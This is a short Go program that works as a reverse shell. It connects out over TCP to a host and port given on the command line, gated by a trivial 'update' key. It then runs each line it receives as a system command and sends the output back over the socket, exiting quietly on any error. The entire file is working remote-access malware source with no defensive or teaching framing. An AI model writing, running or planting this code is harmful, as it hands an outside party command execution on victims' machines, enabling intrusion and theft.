package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {

    var host string
    var port string
    var keys string
    var commander []byte
    var err error
    
    argLength := len(os.Args[1:])
    if argLength >= 3 {
        host = os.Args[1]
        port = os.Args[2]
        keys = os.Args[3]
    } else {
        os.Exit(3)
    }

    addr,err := net.LookupIP(host) // Convert to ipv4 

    if err != nil {
    	os.Exit(3) // Exit on failed lookup
    }
    
    ip := addr[0].String()

    if keys == "update" {
    } else  {
        os.Exit(3) // Exit on failed key
    }

    connector, err := net.Dial("tcp",ip + ":" + port)
    
    if err != nil {
        os.Exit(3) // Exit on failed connection
    }

        for {
            buffer, _ := bufio.NewReader(connector).ReadString('\n') // get data from connection
            command := strings.Split(buffer, " ") // split cmd and args
            length := len(command) // need this for args
            arguments := strings.Join(command[1:length], " ") // reform args
            args := strings.TrimSuffix(arguments,"\n") // trim null
            cmd := strings.TrimSuffix(command[0],"\n") // trim null

            if length == 1 {
                commander, err = exec.Command(cmd).Output()
            }
            if length >= 2 {
                commander, err = exec.Command(cmd,args).Output()
            }
            if err != nil {
                fmt.Fprintf(connector, "%s\n", err)
            }
            fmt.Fprintf(connector, "%s\n", commander)
        }
    }
